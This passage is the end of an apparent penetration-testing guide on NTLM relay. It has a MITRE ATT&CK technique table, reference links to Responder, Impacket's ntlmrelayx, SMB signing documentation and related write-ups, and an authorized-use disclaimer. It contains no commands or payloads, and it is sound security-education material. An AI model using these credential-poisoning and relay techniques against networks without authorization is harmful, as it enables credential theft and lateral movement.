| Technique ID | Name | Phase |
|---|---|---|
| [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | LLMNR/NBT-NS Poisoning | Credential Access |
| [T1187](https://attack.mitre.org/techniques/T1187/) | Forced Authentication | Credential Access |
| [T1557](https://attack.mitre.org/techniques/T1557/) | Adversary-in-the-Middle | Credential Access |
| [T1068](https://attack.mitre.org/techniques/T1068/) | Exploitation for Privilege Escalation | Privilege Escalation |
| [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | Lateral Movement |
| [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | SAM Database Dump | Credential Access |

---

## Reference & Resources

::card-group
  ::card
  ---
  title: The Hacker Recipes — NTLM Relay
  icon: i-lucide-book-open
  to: https://www.thehacker.recipes/ad/movement/ntlm/relay
  target: _blank
  ---
  Comprehensive reference for all NTLM relay techniques, including cross-protocol relay paths and tool usage.
  ::

  ::card
  ---
  title: Impacket — ntlmrelayx
  icon: i-simple-icons-github
  to: https://github.com/fortra/impacket
  target: _blank
  ---
  The industry-standard Python toolset for NTLM relay attacks. Includes ntlmrelayx, secretsdump, and dozens of other AD attack tools.
  ::

  ::card
  ---
  title: Responder
  icon: i-simple-icons-github
  to: https://github.com/lgandx/Responder
  target: _blank
  ---
  LLMNR, NBT-NS, and mDNS poisoner. The go-to tool for capturing and relaying NTLM credentials on local networks.
  ::

  ::card
  ---
  title: Microsoft — SMB Signing Overview
  icon: i-simple-icons-microsoft
  to: https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing
  target: _blank
  ---
  Official Microsoft documentation on SMB signing — configuration, requirements, and performance impact.
  ::

  ::card
  ---
  title: MITRE ATT&CK — LLMNR/NBT-NS Poisoning
  icon: i-lucide-shield
  to: https://attack.mitre.org/techniques/T1557/001/
  target: _blank
  ---
  MITRE's detailed breakdown of the technique including detection strategies, real-world examples, and related mitigations.
  ::

  ::card
  ---
  title: SpecterOps — An SMB Relay Race
  icon: i-lucide-file-text
  to: https://posts.specterops.io/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit-7cf5c7571f62
  target: _blank
  ---
  Deep technical blog post by SpecterOps covering real-world relay attack scenarios and defense recommendations.
  ::
::

---

::warning
**Legal Disclaimer:** The techniques described in this guide are intended for **authorized penetration testing**, **security research**, and **defensive education** only. Always obtain **written permission** before testing on any network. Unauthorized access to computer systems is a criminal offense.
::